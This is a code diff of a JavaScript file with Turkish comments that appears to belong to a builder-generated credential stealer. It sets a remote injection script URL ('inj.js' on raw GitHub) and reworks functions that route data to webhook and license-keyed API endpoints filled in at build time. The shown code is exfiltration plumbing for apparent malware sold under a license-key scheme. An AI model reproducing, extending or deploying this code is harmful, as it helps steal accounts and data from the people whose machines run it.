@@ -16,7 +16,7 @@ const LICENSE_KEY = "%LICENSE_KEY%";
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    api: "%apiwebhook",
+    api: "%API_WEBHOOK%",
     license_api: LICENSE_API,
     license_key: LICENSE_KEY,
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/inj.js",
@@ -163,15 +163,36 @@ req.on("error", reject);
 
 // hairo.tr domain sistemi için webhook URL'lerini oluştur
 function getWebhookUrl() {
-    if (CONFIG.license_api && CONFIG.license_key && CONFIG.license_api !== "%LICENSE_API_URL%" && CONFIG.license_key !== "%LICENSE_KEY%") {
-        const apiUrl = CONFIG.license_api.replace(/\/$/, '');
+    // Eğer CONFIG.webhook zaten değiştirilmişse (placeholder değilse) direkt kullan
+    if (CONFIG.webhook && CONFIG.webhook !== '%WEBHOOK%' && 
+        (CONFIG.webhook.startsWith('http://') || CONFIG.webhook.startsWith('https://'))) {
+        return CONFIG.webhook;
+    }
+    
+    // Yeni sistem: license_api ve license_key varsa hairo.tr/key formatında oluştur
+    if (CONFIG.license_api && CONFIG.license_key && 
+        CONFIG.license_api !== '%LICENSE_API_URL%' && 
+        CONFIG.license_key !== '%LICENSE_KEY%') {
+        const apiUrl = CONFIG.license_api.replace(/\/$/, ''); // Trailing slash'i kaldır
         return `${apiUrl}/${CONFIG.license_key}`;
     }
+    
+    // Fallback: Eski webhook kullan (placeholder olabilir)
     return CONFIG.webhook;
 }
 
 function getApiWebhookUrl() {
-    if (CONFIG.license_api && CONFIG.license_key && CONFIG.license_api !== "%LICENSE_API_URL%" && CONFIG.license_key !== "%LICENSE_KEY%") {
+    // Eğer CONFIG.api zaten değiştirilmişse (placeholder değilse) direkt kullan
+    // builder.js build sırasında %API_WEBHOOK% yerine hairo.tr/key/api koyuyor
+    if (CONFIG.api && CONFIG.api !== '%API_WEBHOOK%' && 
+        (CONFIG.api.startsWith('http://') || CONFIG.api.startsWith('https://'))) {
+        return CONFIG.api;
+    }
+    
+    // Yeni sistem: license_api ve license_key varsa hairo.tr/key/api formatında oluştur
+    if (CONFIG.license_api && CONFIG.license_key && 
+        CONFIG.license_api !== '%LICENSE_API_URL%' && 
+        CONFIG.license_key !== '%LICENSE_KEY%') {
         const apiUrl = CONFIG.license_api.replace(/\/$/, '');
         return `${apiUrl}/${CONFIG.license_key}/api`;
     }
